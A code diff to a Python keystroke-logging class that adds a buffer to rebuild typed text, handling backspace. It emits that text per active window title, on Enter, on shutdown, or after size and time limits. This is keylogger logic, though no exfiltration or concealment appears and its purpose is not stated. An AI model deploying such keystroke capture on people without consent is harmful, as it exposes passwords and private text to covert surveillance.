@@ -192,6 +192,9 @@ class KeystrokeProcessor:
         keyboard.Key.cmd,    keyboard.Key.cmd_r,
     }
 
+    RECON_MAX_LEN = 500       # auto-emit if buffer exceeds this
+    RECON_MAX_AGE = 5.0       # auto-emit after this many seconds
+
     def __init__(self, log_buffer):
         self.log = log_buffer
         self.active_mods = set()
@@ -200,12 +203,15 @@ class KeystrokeProcessor:
         self._flush_timer = None
         self._flush_delay = 0.4   # seconds of idle before auto-flush
         self._window = ""
+        self._recon = ""
+        self._recon_start = 0.0   # timestamp of first char in current recon
 
     # ── public API called by the Listener callbacks ──
 
     def set_window(self, title):
         if title != self._window:
             self.flush()
+            self._emit_recon()
             self._window = title
 
     def on_press(self, key):
@@ -224,14 +230,17 @@ class KeystrokeProcessor:
             self._append_char(" ")
             return
 
-        # Enter → flush text, then log Enter
+        # Enter → flush text, emit reconstructed text, then log Enter
         if key == keyboard.Key.enter:
             self.flush()
+            self._emit_recon()
             self._emit("Enter key")
             return
 
         # Backspace → remove last char from buffer (or log if empty)
         if key == keyboard.Key.backspace:
+            if self._recon:
+                self._recon = self._recon[:-1]
             with self._text_lock:
                 if self._text:
                     self._text = self._text[:-1]
@@ -269,16 +278,34 @@ class KeystrokeProcessor:
             self._text = ""
         if text:
             self._emit(f"Keystroke: {text}")
+        # time-based recon emit (prevents unbounded growth during gaming)
+        if self._recon and self._recon_start and \
+                (time.monotonic() - self._recon_start) >= self.RECON_MAX_AGE:
+            self._emit_recon()
 
     def shutdown(self):
         self.flush()
+        self._emit_recon()
 
     # ── internals ──
 
     def _append_char(self, ch):
         with self._text_lock:
             self._text += ch
+        if not self._recon:
+            self._recon_start = time.monotonic()
+        self._recon += ch
+        if len(self._recon) >= self.RECON_MAX_LEN:
+            self._emit_recon()
         self._schedule_flush()
+
+    def _emit_recon(self):
+        """Emit the reconstructed text summary and reset the buffer."""
+        text = self._recon.strip()
+        self._recon = ""
+        self._recon_start = 0.0
+        if text:
+            self._emit(f"Text: {text}")
 
     def _schedule_flush(self):
         if self._flush_timer:
